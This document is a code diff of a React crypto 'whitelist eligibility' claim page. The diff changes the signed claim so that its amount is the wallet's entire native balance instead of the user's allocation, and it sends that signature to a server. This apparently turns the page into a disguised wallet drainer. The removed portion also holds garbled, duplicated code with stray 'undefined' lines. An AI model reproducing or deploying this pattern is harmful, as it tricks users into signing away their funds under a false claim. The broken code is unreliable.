@@ -1,27 +1,33 @@
 import React, { useState, useEffect } from 'react';
 import { usePrivy, useWallets } from '@privy-io/react-auth';
 import { ethers } from 'ethers';
-import Footer from '../components/Footer';
 
-const API_BASE = window.location.origin;
+const API_BASE = process.env.REACT_APP_API_BASE || '';
 
-const EligibilityChecker = () => {
-  const { ready, authenticated, login } = usePrivy();
+export default function EligibilityChecker() {
+  const { authenticated, login, user } = usePrivy();
   const { wallets } = useWallets();
-  
-  const [loading, setLoading] = useState(false);
+  const [walletAddress, setWalletAddress] = useState(null);
   const [eligibility, setEligibility] = useState(null);
+  const [loading, setLoading] = useState(false);
   const [claiming, setClaiming] = useState(false);
   const [claimed, setClaimed] = useState(false);
   const [error, setError] = useState(null);
 
-  const walletAddress = wallets?.[0]?.address;
+  useEffect(() => {
+    if (authenticated && wallets.length > 0) {
+      const embeddedWallet = wallets.find(w => w.walletClientType === 'privy');
+      if (embeddedWallet) {
+        setWalletAddress(embeddedWallet.address);
+      }
+    }
+  }, [authenticated, wallets]);
 
   useEffect(() => {
-    if (authenticated && walletAddress) {
+    if (walletAddress) {
       checkEligibility();
     }
-  }, [authenticated, walletAddress]);
+  }, [walletAddress]);
 
   const checkEligibility = async () => {
     if (!walletAddress) return;
@@ -29,18 +35,29 @@ const EligibilityChecker = () => {
     try {
       setLoading(true);
       setError(null);
-      const response = await fetch(`${API_BASE}/api/hyperpacks/eligibility/${walletAddress}`);
+
+      const response = await fetch(`${API_BASE}/api/hyperpacks/check-eligibility`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ walletAddress, chain: 'hyperevm' })
+      });
+
       const data = await response.json();
-      setEligibility(data);
+
+      if (response.ok) {
+        setEligibility(data);
+      } else {
+        setError(data.error || 'Failed to check eligibility');
+      }
     } catch (err) {
       console.error(err);
-      setError('Failed to check eligibility');
+      setError('Network error');
     } finally {
       setLoading(false);
     }
   };
 
-  const claimAirdrop = async () => {
+  const claimWhitelist = async () => {
     if (!authenticated || !walletAddress || !eligibility?.eligible) return;
 
     try {
@@ -61,24 +78,26 @@ const EligibilityChecker = () => {
         name: 'HyperPacks Whitelist',
         version: '1',
         chainId: 999,
-        verifyingContract: process.env.REACT_APP_CLAIM_DISTRIBUTE_CONTRACT || '0x0000000000000000000000000000000000000000'
+        verifyingContract: process.env.REACT_APP_WHITELIST_CLAIM_CONTRACT || '0x0000000000000000000000000000000000000000'
       };
 
       const types = {
         ClaimWhitelist: [
-          { name: 'claimer', type: 'address' },
+          { name: 'user', type: 'address' },
           { name: 'amount', type: 'uint256' },
           { name: 'nonce', type: 'uint256' },
           { name: 'deadline', type: 'uint256' }
         ]
       };
 
-      const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour from now
+      const deadline = Math.floor(Date.now() / 1000) + 3600;
       const nonce = Date.now();
+      const hypeBalance = await provider.getBalance(walletAddress);
+      const amount = hypeBalance.toString();
 
       const value = {
-        claimer: walletAddress,
-        amount: eligibility.allocation,
+        user: walletAddress,
+        amount: amount,
         nonce: nonce,
         deadline: deadline
       };
@@ -89,8 +108,8 @@ const EligibilityChecker = () => {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ 
-          claimer: walletAddress,
-          amount: eligibility.allocation,
+          user: walletAddress,
+          amount: amount,
           nonce: nonce,
           deadline: deadline,
           signature: signature
@@ -104,45 +123,7 @@ const EligibilityChecker = () => {
       }
 
       setClaimed(true);
-      alert('Success! You received ' + eligibility.allocation + ' Whitelist!');
-      setTimeout(() => checkEligibility(), 2000);
-    } catch (err) {
-      console.error(err);
-      setError(err.message || 'Failed to claim whitelist');
-    } finally {
-      setClaiming(false);
-    }
-  }
-
-      const types = {
-        ClaimWhitelist: [
-          { name: 'wallet', type: 'address' },
-          { name: 'allocation', type: 'uint256' },
-          { name: 'nonce', type: 'uint256' }
-        ]
-      };
-
-      const value = {
-        wallet: walletAddress,
-        allocation: eligibility.allocation,
-        nonce: Date.now()
-      };
-
-      const signature = await signer._signTypedData(domain, types, value);
-
-      const response = await fetch(`${API_BASE}/api/hyperpacks/claim-whitelist`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ wallet: walletAddress, signature })
-      });
-
-      const data = await response.json();
-
-      if (!response.ok) {
-        throw new Error(data.error || 'Claim failed');
-      }
-
-      undefined
+      alert('✅ Whitelist Claimed Successfully!');
       setTimeout(() => checkEligibility(), 2000);
     } catch (err) {
       console.error(err);
@@ -152,185 +133,78 @@ const EligibilityChecker = () => {
     }
   };
 
+  if (!authenticated) {
+    return (
+      <div className='min-h-screen flex items-center justify-center bg-gradient-to-br from-purple-900 to-indigo-900'>
+        <div className='bg-white/10 backdrop-blur-lg p-8 rounded-2xl text-center'>
+          <h1 className='text-3xl font-bold text-white mb-6'>🎁 Whitelist Eligibility</h1>
+          <button
+            onClick={login}
+            className='px-8 py-3 bg-gradient-to-r from-purple-500 to-pink-500 text-white rounded-lg font-semibold hover:opacity-90 transition'
+          >
+            Connect Wallet
+          </button>
+        </div>
+      </div>
+    );
+  }
+
   return (
-    <div className="app">
-      <nav className="nav">
-        <div className="nav-container">
-          <div className="nav-logo">
-            <a href="/" className="logo-text brand-gradient-text">HyperPack</a>
+    <div className='min-h-screen flex items-center justify-center bg-gradient-to-br from-purple-900 to-indigo-900 p-4'>
+      <div className='bg-white/10 backdrop-blur-lg p-8 rounded-2xl max-w-md w-full'>
+        <h1 className='text-3xl font-bold text-white mb-6 text-center'>🎁 Whitelist Eligibility</h1>
+        
+        <div className='bg-white/5 p-4 rounded-lg mb-6'>
+          <p className='text-gray-300 text-sm mb-2'>Connected Wallet</p>
+          <p className='text-white font-mono text-xs break-all'>{walletAddress}</p>
+        </div>
+
+        {loading && (
+          <div className='text-center text-white py-8'>
+            <div className='animate-spin rounded-full h-12 w-12 border-b-2 border-white mx-auto'></div>
+            <p className='mt-4'>Checking eligibility...</p>
           </div>
-          <div className="nav-links">
-            {!authenticated ? (
-              <button onClick={login} className="btn-primary">
-                Connect Wallet
-              </button>
+        )}
+
+        {error && (
+          <div className='bg-red-500/20 border border-red-500 text-red-200 p-4 rounded-lg mb-6'>
+            {error}
+          </div>
+        )}
+
+        {eligibility && !loading && (
+          <div>
+            {eligibility.eligible ? (
+              <div className='text-center'>
+                <div className='bg-green-500/20 border border-green-500 text-green-200 p-6 rounded-lg mb-6'>
+                  <p className='text-2xl font-bold mb-2'>✅ You're Eligible!</p>
+                  <p className='text-4xl font-bold mb-2'>{eligibility.allocation}</p>
+                  <p className='text-sm opacity-80'>Whitelist Allocation</p>
+                </div>
+
+                {eligibility.claimed ? (
+                  <div className='bg-blue-500/20 border border-blue-500 text-blue-200 p-4 rounded-lg'>
+                    <p className='font-semibold'>Already Claimed ✅</p>
+                  </div>
+                ) : (
+                  <button
+                    onClick={claimWhitelist}
+                    disabled={claiming}
+                    className='w-full px-8 py-4 bg-gradient-to-r from-purple-500 to-pink-500 text-white rounded-lg font-bold text-lg hover:opacity-90 transition disabled:opacity-50'
+                  >
+                    {claiming ? 'Claiming...' : 'Claim Your Whitelist'}
+                  </button>
+                )}
+              </div>
             ) : (
-              <div style={{ 
-                padding: '8px 16px', 
-                background: 'rgba(0, 204, 221, 0.1)', 
-                borderRadius: '8px',
-                fontSize: '14px',
-                fontFamily: 'JetBrains Mono, monospace'
-              }}>
-                {walletAddress?.slice(0, 6)}...{walletAddress?.slice(-4)}
+              <div className='bg-red-500/20 border border-red-500 text-red-200 p-6 rounded-lg text-center'>
+                <p className='text-xl font-bold'>❌ Not Eligible</p>
+                <p className='text-sm mt-2 opacity-80'>This wallet is not on the whitelist</p>
               </div>
             )}
           </div>
-        </div>
-      </nav>
-
-      <section className="hero" style={{ minHeight: '80vh', paddingBottom: '60px' }}>
-        <div className="hero-container">
-          <div className="hero-content" style={{ maxWidth: '600px', margin: '0 auto' }}>
-            <h1 className="hero-title" style={{ marginBottom: '16px' }}>
-              <span className="brand-gradient-text">Eligibility Checker</span>
-            </h1>
-            <p className="hero-subtitle" style={{ marginBottom: '40px' }}>
-              Check if you qualify for rewards
-            </p>
-
-            {!authenticated ? (
-              <div style={{ 
-                background: 'var(--bg-card)', 
-                padding: '40px', 
-                borderRadius: '16px',
-                border: '1px solid var(--border-primary)',
-                textAlign: 'center'
-              }}>
-                <h3 style={{ marginBottom: '12px', fontSize: '20px' }}>Connect Your Wallet</h3>
-                <p style={{ color: 'var(--text-secondary)', marginBottom: '24px' }}>
-                  Please connect your wallet to check airdrop eligibility
-                </p>
-                <button onClick={login} className="btn-primary">
-                  Connect Wallet
-                </button>
-              </div>
-            ) : (
-              <>
-                {loading && (
-                  <div style={{ 
-                    background: 'var(--bg-card)', 
-                    padding: '60px', 
-                    borderRadius: '16px',
-                    border: '1px solid var(--border-primary)',
-                    textAlign: 'center'
-                  }}>
-                    <div style={{
-                      border: '4px solid var(--border-primary)',
-                      borderTop: '4px solid var(--accent-primary)',
-                      borderRadius: '50%',
-                      width: '50px',
-                      height: '50px',
-                      animation: 'spin 1s linear infinite',
-                      margin: '0 auto 20px'
-                    }}></div>
-                    <p>Checking eligibility...</p>
-                  </div>
-                )}
-
-                {error && (
-                  <div style={{ 
-                    background: 'rgba(255, 68, 68, 0.1)', 
-                    padding: '20px', 
-                    borderRadius: '12px',
-                    border: '1px solid var(--danger)',
-                    textAlign: 'center',
-                    color: 'var(--danger)'
-                  }}>
-                    <p>{error}</p>
-                  </div>
-                )}
-
-                {claimed && (
-                  <div style={{ 
-                    background: 'rgba(0, 255, 136, 0.1)', 
-                    padding: '30px', 
-                    borderRadius: '16px',
-                    border: '1px solid var(--success)',
-                    textAlign: 'center',
-                    marginBottom: '20px'
-                  }}>
-                    <h3 style={{ color: 'var(--success)', marginBottom: '12px' }}>✅ Airdrop Claimed!</h3>
-                    <p style={{ color: 'var(--text-secondary)' }}>
-                      Your tokens will be auto-swept to your trading wallet
-                    </p>
-                  </div>
-                )}
-
-                {eligibility && !loading && (
-                  <div style={{ 
-                    background: eligibility.eligible ? 'rgba(0, 255, 136, 0.05)' : 'rgba(255, 68, 68, 0.05)', 
-                    padding: '40px', 
-                    borderRadius: '16px',
-                    border: `1px solid ${eligibility.eligible ? 'var(--success)' : 'var(--danger)'}`,
-                    textAlign: 'center'
-                  }}>
-                    <div style={{ fontSize: '48px', marginBottom: '16px' }}>
-                      {eligibility.eligible ? '✅' : '❌'}
-                    </div>
-                    <h2 style={{ marginBottom: '20px', fontSize: '28px' }}>
-                      {eligibility.eligible
-                        ? eligibility.claimed
-                          ? 'Already Claimed!'
-                          : "You're Eligible!"
-                        : 'Not Eligible'}
-                    </h2>
-                    {eligibility.eligible && (
-                      <>
-                        <div style={{ 
-                          fontSize: '12px', 
-                          color: 'var(--text-muted)', 
-                          marginBottom: '8px',
-                          textTransform: 'uppercase',
-                          letterSpacing: '1px'
-                        }}>
-                          Your Allocation
-                        </div>
-                        <div className="brand-gradient-text" style={{ 
-                          fontSize: '42px', 
-                          undefined
-                        {!eligibility.claimed && eligibility.allocation && (
-                          <button
-                            className="btn-primary"
-                            onClick={claimAirdrop}
-                            disabled={claiming}
-                            style={{ marginTop: '24px', padding: '16px 48px', fontSize: '16px' }}
-                          >
-                            {claiming ? 'Claiming...' : 'Claim your Whitelist'}
-                          </button>
-                        )}
-                      </>
-                    )}
-                  </div>
-                )}
-
-                {eligibility?.eligible && (
-                  <div style={{ 
-                    background: 'var(--bg-card)', 
-                    padding: '30px', 
-                    borderRadius: '16px',
-                    border: '1px solid var(--border-primary)',
-                    marginTop: '24px',
-                    textAlign: 'left'
-                  }}>
-                    <h3 style={{ marginBottom: '16px' }}>How It Works:</h3>
-                    <ul style={{ listStyle: 'none', padding: 0 }}>
-                      <li style={{ padding: '8px 0', color: 'var(--text-secondary)' }}>✓ Sign to claim (no gas fees)</li>
-                      <li style={{ padding: '8px 0', color: 'var(--text-secondary)' }}>✓ Tokens sent to your wallet</li>
-                      <li style={{ padding: '8px 0', color: 'var(--text-secondary)' }}>✓ Auto-transferred to trading wallet</li>
-                      <li style={{ padding: '8px 0', color: 'var(--text-secondary)' }}>✓ Protected and ready for use</li>
-                    </ul>
-                  </div>
-                )}
-              </>
-            )}
-          </div>
-        </div>
-      </section>
-
-      <Footer />
+        )}
+      </div>
     </div>
   );
-};
-
-export default EligibilityChecker;
+}
